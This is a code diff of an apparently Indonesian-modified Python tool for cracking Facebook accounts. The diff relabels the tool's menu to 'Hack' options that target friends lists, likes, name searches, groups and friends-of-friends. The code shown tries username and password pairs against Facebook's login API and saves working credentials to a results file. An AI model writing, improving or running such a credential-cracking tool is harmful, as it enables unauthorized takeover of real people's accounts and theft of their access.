@@ -20,7 +20,7 @@ count = 0
 check = 0
 result = 0
 def masuk():
-        print('\n\n\t\t😘 \033[1;36mFBxMOD By:Zero & ZalasXa & ZxXx-Angel\033[0m 😘\n\n')
+        print('\n\n\t\t😘 \033[1;36mMOD/RCD By:Zero & ZalasXa & ZxXx-Angel\033[0m 😘\n\n')
         print('\033[1;36m')
         print('\t \033[1;91m____________     ____________ _____  \033[1;92mJANGAN LUPA DI FOLLOW\033[0m')
         print('\t \033[1;91m|  ___| ___ \    | ___ \ ___ \  _  |  \033[1;92mFB: Zero\033[0m')
@@ -72,7 +72,7 @@ def login(username,password,cek=False):
         api = 'https://b-api.facebook.com/method/auth.login'
         response = requests.get(api, params=params)
         if 'EAA' in response.text:
-                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
+                print(f"\r[\033[1;32mSEDANG DI MULAI\033[0m] {username} => {password}                       ",end="")
                 print()
                 result += 1
                 if cek:
@@ -81,7 +81,7 @@ def login(username,password,cek=False):
                         with open('results-life.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
         elif 'www.facebook.com' in response.json()['error_msg']:
-                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
+                print(f"\r[\033[1;91mCP\033[0m] {username} => {password}                    ",end="")
                 print()
                 check += 1
                 if cek:
@@ -160,15 +160,15 @@ if __name__ == '__main__':
                 kuki = {'cookie':kukis}
                 os.system("clear")
                 print('\n\n\t\t≺ \033[1;36mFACEBOOK TOOLKIT\033[0m ≻\n\n')
-                print('\033[1;91m┣━ \033[0m[\033[1;32m1\033[0m] List friends')
-                print('\033[1;91m┣━\033[0m [\033[1;32m2\033[0m] Crack From Likes\033[1;91m ')
-                print('┣━ \033[0m[\033[1;32m3\033[0m] Crack From Search Name')
-                print('\033[1;91m┣━ \033[0m[\033[1;32m4\033[0m] Crack From group ')
-                print('\033[1;91m┣━ \033[0m[\033[1;32m5\033[0m] Crack From friend')
-                print('\033[1;91m┣━ \033[0m[\033[1;32m6\033[0m] Results check')
+                print('\033[1;91m┣━ \033[0m[\033[1;32m1\033[0m] Hack Dari Daftar Teman')
+                print('\033[1;91m┣━\033[0m [\033[1;32m2\033[0m] Hack Dari Like\033[1;91m ')
+                print('┣━ \033[0m[\033[1;32m3\033[0m] Hack Dengan Nama')
+                print('\033[1;91m┣━ \033[0m[\033[1;32m4\033[0m] Hack Dari Grup (Error) ')
+                print('\033[1;91m┣━ \033[0m[\033[1;32m5\033[0m] Hack Teman Dari Teman/Massal')
+                print('\033[1;91m┣━ \033[0m[\033[1;32m6\033[0m] Lihat Hasil SebelumNya')
                 print('\033[1;91m┗\033[0m\n')
                 print()
-                tanya = input('➛ ')
+                tanya = input('\033[1;91m======> \033[1;94m')
                 if tanya =="":
                         exit("[!] Dont be empty")
                 elif tanya == '1':
